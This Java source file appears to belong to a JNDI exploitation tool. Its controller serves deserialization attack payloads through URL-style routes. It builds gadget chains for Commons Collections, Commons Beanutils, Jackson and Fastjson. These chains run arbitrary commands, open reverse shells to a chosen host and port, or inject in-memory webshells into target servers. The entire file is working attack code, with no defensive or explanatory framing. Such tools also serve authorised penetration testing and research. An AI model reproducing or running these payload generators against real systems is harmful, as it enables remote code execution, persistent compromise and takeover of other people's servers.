package map.jndi.controller;

import com.reajason.javaweb.memshell.config.GenerateResult;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import map.jndi.payload.MemShellPayload;
import map.jndi.gadget.*;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.*;

@JNDIController
@JNDIMapping("/Deserialize")
public class DeserializeController implements Controller {
    public Object process(byte[] data) {
        return data;
    }

    @JNDIMapping("/FromUrl/{data}")
    public byte[] fromUrl(String data) {
        System.out.println("[Deserialize] Load custom serialized data from url");
        return Base64.getUrlDecoder().decode(data);
    }

    @JNDIMapping("/FromFile/{path}")
    public byte[] fromFile(String path) throws Exception {
        System.out.println("[Deserialize] Load custom serialized data from file: " + path);
        return Files.readAllBytes(Paths.get(path));
    }

    @JNDIMapping("/URLDNS/{url}")
    public byte[] URLDNS(String url) throws Exception {
        System.out.println("[Deserialize] [URLDNS] URL: " + url);

        return URLDNS.create(url);
    }

    @JNDIMapping("/CommonsCollectionsK1/Command/{cmd}")
    public byte[] CommonsCollectionsK1Cmd(String cmd) throws Exception {
        System.out.println("[Deserialize] [CommonsCollectionsK1] [Command] Cmd: " + cmd);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
        return CommonsCollectionsK1.create(templatesImpl);
    }

    @JNDIMapping("/CommonsCollectionsK1/ReverseShell/{host}/{port}")
    public byte[] CommonsCollectionsK1ReverseShell(String host, String port) throws Exception {
        System.out.println("[Deserialize] [CommonsCollectionsK1] [ReverseShell] Host: " + host + " Port: " + port);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
        return CommonsCollectionsK1.create(templatesImpl);
    }

    @JNDIMapping("/CommonsCollectionsK1/MemShell/{server}/{tool}/{type}")
    public byte[] CommonsCollectionsK1MemShell(String server, String tool, String type) throws Exception {
        System.out.println("[Deserialize] [CommonsCollectionsK1] [MemShell] Server: " + server + " Tool: " + tool + " Type: " + type);

        GenerateResult result = MemShellPayload.generate(server, tool, type);
        MemShellPayload.printInfo(result);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(result.getInjectorBytes());
        return CommonsCollectionsK1.create(templatesImpl);
    }

    @JNDIMapping("/CommonsCollectionsK2/Command/{cmd}")
    public byte[] CommonsCollectionsK2Cmd(String cmd) throws Exception {
        System.out.println("[Deserialize] [CommonsCollectionsK2] [Command] Cmd: " + cmd);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
        return CommonsCollectionsK2.create(templatesImpl);
    }

    @JNDIMapping("/CommonsCollectionsK2/ReverseShell/{host}/{port}")
    public byte[] CommonsCollectionsK2ReverseShell(String host, String port) throws Exception {
        System.out.println("[Deserialize] [CommonsCollectionsK2] [ReverseShell] Host: " + host + " Port: " + port);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
        return CommonsCollectionsK2.create(templatesImpl);
    }

    @JNDIMapping("/CommonsCollectionsK2/MemShell/{server}/{tool}/{type}")
    public byte[] CommonsCollectionsK2MemShell(String server, String tool, String type) throws Exception {
        System.out.println("[Deserialize] [CommonsCollectionsK2] [MemShell] Server: " + server + " Tool: " + tool + " Type: " + type);

        GenerateResult result = MemShellPayload.generate(server, tool, type);
        MemShellPayload.printInfo(result);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(result.getInjectorBytes());
        return CommonsCollectionsK2.create(templatesImpl);
    }

    @JNDIMapping("/CommonsCollectionsK3/Command/{cmd}")
    public byte[] CommonsCollectionsK3Cmd(String cmd) throws Exception {
        System.out.println("[Deserialize] [CommonsCollectionsK3] [Command] Cmd: " + cmd);

        return CommonsCollectionsK3.create(cmd);
    }

    @JNDIMapping("/CommonsCollectionsK4/Command/{cmd}")
    public byte[] CommonsCollectionsK4Cmd(String cmd) throws Exception {
        System.out.println("[Deserialize] [CommonsCollectionsK4] [Command] Cmd: " + cmd);

        return CommonsCollectionsK4.create(cmd);
    }

    @JNDIMapping("/CommonsBeanutils183/Command/{cmd}")
    public byte[] CommonsBeanutils183Cmd(String cmd) throws Exception {
        System.out.println("[Deserialize] [CommonsBeanutils183] [Command] Cmd: " + cmd);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
        return CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.8.3.jar");
    }

    @JNDIMapping("/CommonsBeanutils183/ReverseShell/{host}/{port}")
    public byte[] CommonsBeanutils183ReverseShell(String host, String port) throws Exception {
        System.out.println("[Deserialize] [CommonsBeanutils183] [ReverseShell] Host: " + host + " Port: " + port);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
        return CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.8.3.jar");
    }

    @JNDIMapping("/CommonsBeanutils183/MemShell/{server}/{tool}/{type}")
    public byte[] CommonsBeanutils183MemShell(String server, String tool, String type) throws Exception {
        System.out.println("[Deserialize] [CommonsBeanutils183] [MemShell] Server: " + server + " Tool: " + tool + " Type: " + type);

        GenerateResult result = MemShellPayload.generate(server, tool, type);
        MemShellPayload.printInfo(result);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(result.getInjectorBytes());
        return CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.8.3.jar");
    }

    @JNDIMapping("/CommonsBeanutils194/Command/{cmd}")
    public byte[] CommonsBeanutils194Cmd(String cmd) throws Exception {
        System.out.println("[Deserialize] [CommonsBeanutils194] [Command] Cmd: " + cmd);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
        return CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.9.4.jar");
    }

    @JNDIMapping("/CommonsBeanutils194/ReverseShell/{host}/{port}")
    public byte[] CommonsBeanutils194ReverseShell(String host, String port) throws Exception {
        System.out.println("[Deserialize] [CommonsBeanutils194] [ReverseShell] Host: " + host + " Port: " + port);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
        return CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.9.4.jar");
    }

    @JNDIMapping("/CommonsBeanutils194/MemShell/{server}/{tool}/{type}")
    public byte[] CommonsBeanutils194MemShell(String server, String tool, String type) throws Exception {
        System.out.println("[Deserialize] [CommonsBeanutils194] [MemShell] Server: " + server + " Tool: " + tool + " Type: " + type);

        GenerateResult result = MemShellPayload.generate(server, tool, type);
        MemShellPayload.printInfo(result);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(result.getInjectorBytes());
        return CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.9.4.jar");
    }

    @JNDIMapping("/Jackson/Command/{cmd}")
    public byte[] JacksonCmd(String cmd) throws Exception {
        System.out.println("[Deserialize] [Jackson] [Command] Cmd: " + cmd);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
        return Jackson.create(templatesImpl);
    }

    @JNDIMapping("/Jackson/ReverseShell/{host}/{port}")
    public byte[] JacksonReverseShell(String host, String port) throws Exception {
        System.out.println("[Deserialize] [Jackson] [ReverseShell] Host: " + host + " Port: " + port);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
        return Jackson.create(templatesImpl);
    }

    @JNDIMapping("/Jackson/MemShell/{server}/{tool}/{type}")
    public byte[] JacksonMemShell(String server, String tool, String type) throws Exception {
        System.out.println("[Deserialize] [Jackson] [MemShell] Server: " + server + " Tool: " + tool + " Type: " + type);

        GenerateResult result = MemShellPayload.generate(server, tool, type);
        MemShellPayload.printInfo(result);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(result.getInjectorBytes());
        return Jackson.create(templatesImpl);
    }

    @JNDIMapping("/Fastjson1/Command/{cmd}")
    public byte[] Fastjson1Cmd(String cmd) throws Exception {
        System.out.println("[Deserialize] [Fastjson1] [Command] Cmd: " + cmd);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
        return Fastjson1.create(templatesImpl);
    }

    @JNDIMapping("/Fastjson1/ReverseShell/{host}/{port}")
    public byte[] Fastjson1ReverseShell(String host, String port) throws Exception {
        System.out.println("[Deserialize] [Fastjson1] [ReverseShell] Host: " + host + " Port: " + port);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
        return Fastjson1.create(templatesImpl);
    }

    @JNDIMapping("/Fastjson1/MemShell/{server}/{tool}/{type}")
    public byte[] Fastjson1MemShell(String server, String tool, String type) throws Exception {
        System.out.println("[Deserialize] [Fastjson1] [MemShell] Server: " + server + " Tool: " + tool + " Type: " + type);

        GenerateResult result = MemShellPayload.generate(server, tool, type);
        MemShellPayload.printInfo(result);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(result.getInjectorBytes());
        return Fastjson1.create(templatesImpl);
    }

    @JNDIMapping("/Fastjson2/Command/{cmd}")
    public byte[] Fastjson2Cmd(String cmd) throws Exception {
        System.out.println("[Deserialize] [Fastjson2] [Command] Cmd: " + cmd);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
        return Fastjson2.create(templatesImpl);
    }

    @JNDIMapping("/Fastjson2/ReverseShell/{host}/{port}")
    public byte[] Fastjson2ReverseShell(String host, String port) throws Exception {
        System.out.println("[Deserialize] [Fastjson2] [ReverseShell] Host: " + host + " Port: " + port);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
        return Fastjson2.create(templatesImpl);
    }

    @JNDIMapping("/Fastjson2/MemShell/{server}/{tool}/{type}")
    public byte[] Fastjson2MemShell(String server, String tool, String type) throws Exception {
        System.out.println("[Deserialize] [Fastjson2] [MemShell] Server: " + server + " Tool: " + tool + " Type: " + type);

        GenerateResult result = MemShellPayload.generate(server, tool, type);
        MemShellPayload.printInfo(result);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(result.getInjectorBytes());
        return Fastjson2.create(templatesImpl);
    }
}
